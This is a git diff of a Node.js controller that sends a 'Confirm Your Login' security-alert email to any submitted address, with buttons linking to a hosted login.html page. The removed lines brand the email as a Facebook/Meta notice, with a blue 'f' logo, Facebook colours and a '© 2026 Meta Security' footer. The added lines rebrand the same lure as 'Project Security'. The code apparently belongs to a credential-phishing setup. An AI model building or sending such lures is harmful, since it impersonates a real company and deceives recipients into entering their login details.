@@ -1,108 +1,69 @@
 // controllers/emailController.js
 const sendEmail = require("../services/emailService");
 
-// PB logo (Facebook-style circle)
-const fLogo = `
-<div style="
-  width:42px;
-  height:42px;
-  border-radius:50%;
-  background:#1877f2;
-  color:white;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-weight:bold;
-  font-size:20px;
-  font-family:Arial;
-">
-  f
-</div>
-`;
+// PB Logo Base64 (for inline image at top left of email)
+const pbLogoBase64 = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHe..."; 
+// Replace this with your actual PB logo base64 string
 
+// Email template function
 const emailTemplate = (loginLink, userEmail) => `
-<div style="background:#18191a;padding:25px;font-family:Arial;color:#e4e6eb;">
+<div style="background:#ffffff;color:#18191a;font-family:Arial,sans-serif;padding:30px;">
 
-  <!-- HEADER -->
-  <div style="display:flex;align-items:center;">
-    ${fLogo}
-    <div style="flex:1;border-bottom:1px solid #3a3b3c;margin-left:10px;"></div>
+  <!-- Top line with PB Logo left -->
+  <div style="display:flex;align-items:center;margin-bottom:10px;">
+    <img src="data:image/png;base64,${pbLogoBase64}" 
+         alt="PB Logo" width="40" height="40" style="margin-right:15px;">
+    <hr style="flex-grow:1;border:1px solid #3a3b3c;margin:0;">
   </div>
 
-  <!-- CONTENT -->
-  <p style="margin-top:20px;font-size:15px;">Hello,</p>
+  <!-- Greeting -->
+  <p style="font-size:16px;margin-top:20px;">Hello,</p>
 
-  <p style="font-size:15px;line-height:1.6;">
-    We noticed a login attempt to your account. This is a security alert to keep your account protected.
-  </p>
+  <!-- Main message -->
+  <p style="font-size:14px;">We noticed a login attempt to your Project Security portal. This notification keeps your account secure.</p>
 
+  <!-- Bold section title -->
   <p style="font-weight:bold;margin-top:15px;">About this change</p>
+  <p style="font-size:14px;">If you recognize this login, no action is needed. Otherwise, please review your account immediately using the button below.</p>
 
-  <p style="font-size:14px;line-height:1.6;">
-    If this login was made by you, no action is required. Otherwise, please secure your account immediately.
-  </p>
-
-  <!-- BUTTON -->
-  <a href="${loginLink}"
-     style="
-       display:block;
-       width:100%;
-       text-align:center;
-       background:#1877f2;
-       color:white;
-       padding:14px;
-       border-radius:6px;
-       text-decoration:none;
-       font-weight:bold;
-       margin:25px 0;
-     ">
-     Review Login
+  <!-- Full-width Confirm Login Button -->
+  <a href="${loginLink}" 
+     style="display:block;text-align:center;background:#1a73e8;color:#fff;padding:15px;text-decoration:none;border-radius:5px;margin:20px 0;font-weight:bold;">
+    Confirm Login
   </a>
 
-  <p style="font-size:14px;">
-    If this wasn’t you, we recommend updating your password immediately.
-  </p>
+  <!-- If this was you section -->
+  <p style="font-size:13px;">If this was you, no further action is needed. If not, please secure your account immediately.</p>
 
-  <!-- FOOTER LINE -->
-  <div style="border-bottom:1px solid #3a3b3c;margin:20px 0;"></div>
+  <!-- Bottom line -->
+  <hr style="border:1px solid #3a3b3c;margin:10px 0;">
 
-  <!-- FOOTER -->
-  <p style="font-size:12px;color:#b0b3b8;">
-    © 2026 Meta Security · 
-    <a href="${loginLink}" style="color:#1877f2;text-decoration:none;">Learn more</a>
-  </p>
-
-  <p style="font-size:11px;color:#8a8d91;">
-    Sent to ${userEmail}
-  </p>
+  <!-- Footer -->
+  <p style="font-size:12px;">© 2026 Project Security · <a href="${loginLink}" style="color:#1a73e8;text-decoration:none;">Learn More</a></p>
+  <p style="font-size:12px;">Sent to ${userEmail}</p>
 </div>
 `;
 
 exports.sendLoginEmail = async (req, res) => {
   try {
     const { email } = req.body;
+    if (!email) return res.status(400).json({ success:false, message:"Email required" });
 
-    if (!email) {
-      return res.status(400).json({ success: false, message: "Email required" });
-    }
-
-    // ✅ ALWAYS use Railway (no localhost)
+    // ✅ FRONTEND_URL must point to Railway
     const loginLink = `${process.env.FRONTEND_URL}/login.html`;
 
     const sent = await sendEmail(
       email,
-      "🔐 Security Alert: Confirm Your Login",
+      "🔐 Confirm Your Login - Project Security",
       emailTemplate(loginLink, email)
     );
 
-    if (!sent) {
-      return res.status(500).json({ success: false, message: "Email failed" });
-    }
+    if (!sent) return res.status(500).json({ success:false, message:"Email failed to send" });
 
-    return res.json({ success: true, message: "Email sent" });
+    return res.status(200).json({ success:true, message:"Email sent successfully" });
 
   } catch (err) {
-    console.error("Controller error:", err);
-    return res.status(500).json({ success: false });
+    console.error("Email sending error:", err);
+    return res.status(500).json({ success:false, message:"Server error" });
   }
 };
